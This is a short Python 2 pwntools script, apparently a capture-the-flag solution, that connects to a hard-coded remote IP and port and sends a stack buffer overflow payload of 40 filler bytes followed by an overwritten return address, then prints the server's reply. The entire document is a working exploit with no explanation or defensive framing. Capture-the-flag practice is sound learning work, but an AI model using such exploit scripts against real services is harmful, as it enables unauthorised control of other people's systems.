from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

ip, port = '167.71.130.31', 31053
io = remote(ip, port)

payload = 40*'A' + p64(0x401176)

io.recvuntil('Enter payload here:')
io.sendline(payload)
print io.recvall()
